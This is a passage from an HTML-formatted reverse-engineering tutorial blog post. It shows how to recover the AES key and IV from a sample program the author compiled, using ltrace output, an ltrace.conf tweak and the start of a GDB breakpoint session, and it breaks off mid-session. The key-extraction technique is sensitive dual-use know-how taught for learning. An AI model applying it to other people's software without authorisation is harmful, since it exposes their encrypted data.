&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048ad3&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;EVP_CIPHER_CTX_new&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb77789c0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff883ec&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb764bda0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb764b910&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x90bdce0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048ae6&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;EVP_aes_256_cbc&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb77789c0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff883ec&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb764bda0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb764b910&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7735040&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048b0b&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;EVP_DecryptInit_ex&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x90bdce0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7735040&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048d50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048d71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048b3c&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;EVP_DecryptUpdate&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x90bdce0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff8836c&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff88324&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff883ec&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048b6c&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;EVP_DecryptFinal_ex&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x90bdce0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff8838c&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff88324&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff883ec&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048b87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;EVP_CIPHER_CTX_free&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x90bdce0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff8838c&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff88324&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff883ec&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048ca3&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;puts&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Decrypted text is:&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;Decrypted&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;text&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;is&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;                                         &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;19&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048caf&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;puts&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;The quick brown fox jumps over t&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;...The&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;quick&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;brown&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;fox&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jumps&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;over&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;lazy&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;dog&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;                        &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;44&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048cb4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;EVP_cleanup&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xbff8836c&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048d50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048d71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff8836c&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;      &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048cb9&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ERR_free_strings&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xbff8836c&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048d50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048d71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff8836c&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xffffffff&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+++&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;exited&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;status&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+++&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;In a non-ideal situation, we have to either recognize the good functions from past experience or search them all. Here we are looking for a function with key and IV as parameters. According to the &lt;a href=&#34;https://www.openssl.org/docs/crypto/EVP_EncryptInit.html&#34; target=&#34;_blank&#34;&gt;documentation&lt;/a&gt; &lt;code&gt;EVP_DecryptInit_ex&lt;/code&gt; is what we are looking for:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;int EVP_DecryptInit_ex(EVP_CIPHER_CTX *ctx, const EVP_CIPHER *type, ENGINE *impl, unsigned char *key, unsigned char *iv);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;But what are these values:&lt;br /&gt;
&lt;code&gt;[0x8048b0b] EVP_DecryptInit_ex(0x90bdce0, 0xb7735040, 0, 0x8048d50, 0x8048d71) = 1&lt;/code&gt;
These are pointers and are 4 bytes each (remember we are in a 32-bit OS). “*But where are these pointers pointing to? Do I have to use GDB?*” Yes, we had to use GDB before I knew that we can configure ltrace to dereference pointers. But we will use GDB too.&lt;/p&gt;

&lt;h5 id=&#34;2-3-1-configuring-ltrace:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;2.3.1 Configuring ltrace&lt;/h5&gt;

&lt;p&gt;If we know the type of pointers, we can dereference them by modifying &lt;a href=&#34;http://man7.org/linux/man-pages/man5/ltrace.conf.5.html&#34; target=&#34;_blank&#34;&gt;~/.ltrace.conf&lt;/a&gt;. We can also do more elaborate stuff like defining structs as explained &lt;a href=&#34;https://github.com/zenovich/ltrace/blob/master/etc/ltrace.conf&#34; target=&#34;_blank&#34;&gt;here&lt;/a&gt;. In short we can add lines to ltrace.conf for certain functions. In our case we know the 4th and 5th arguments for EVP_DecryptInit_ex are strings (char*). We do not care about the first three arguments so can ignore them by defining them as &lt;code&gt;addr&lt;/code&gt; (for address). Let’s add the following line to ltrace.conf:&lt;br /&gt;
&lt;code&gt;int EVP_DecryptInit_ex(addr, addr, addr, string, string)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;run ltrace again and annnnnnnd voila (look at lines 4 for key and IV):



    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;running ltrace after configuration&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;# most of the output has been removed&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_CIPHER_CTX_new(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb77cc9c0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbfdecdec&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb769fda0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb769f910&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x9ff5ce0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_aes_256_cbc(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb77cc9c0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbfdecdec&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb769fda0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb769f910&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7789040&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_DecryptInit_ex(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x09ff5ce0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7789040&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;NULL&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;ee12c03ceacdfb5d4c0e67c8f5ab3362&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;d36a4bf2e6dd9c68&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_DecryptUpdate(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x9ff5ce0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbfdecd6c&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbfdecd24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbfdecdec&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_DecryptFinal_ex(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x9ff5ce0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbfdecd8c&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbfdecd24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbfdecdec&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_CIPHER_CTX_free(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x9ff5ce0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbfdecd8c&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbfdecd24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbfdecdec&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/tales1/Queen-Amused.jpg&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;h4 id=&#34;2-4-finding-the-key-using-gdb-ii-electric-boogaloo:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;2.4  Finding the Key (Using GDB) II: Electric Boogaloo&lt;/h4&gt;

&lt;p&gt;That was too easy but we pleased a powerful friend. Let’s try and find it using GDB (gasp). Good thing that we compiled out binary using the ggdb switch. If not go ahead and do that. We know we are looking for &lt;code&gt;EVP_DecryptInit_ex&lt;/code&gt; and we have already seen how to use GDB. We will &lt;code&gt;set verbose on&lt;/code&gt; (in case stuff happens).&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;running in GDB with debug info 1&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;$&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;gdb&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;sampleaes&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;q&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Reading&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;root&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;Desktop&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;kek&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;sampleaes...done.&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gdb&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;verbose&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;on&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gdb&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;break&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;EVP_DecryptInit_ex&lt;/span&gt;  &lt;span style=&#34;color: #586E75&#34;&gt;; setting up the breakpoint&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Breakpoint&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;at&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048830&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gdb&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;run&lt;/span&gt;                       &lt;span style=&#34;color: #586E75&#34;&gt;; running the program&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Starting&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;program&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;root&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;Desktop&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;kek&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;sampleaes&lt;/span&gt; 
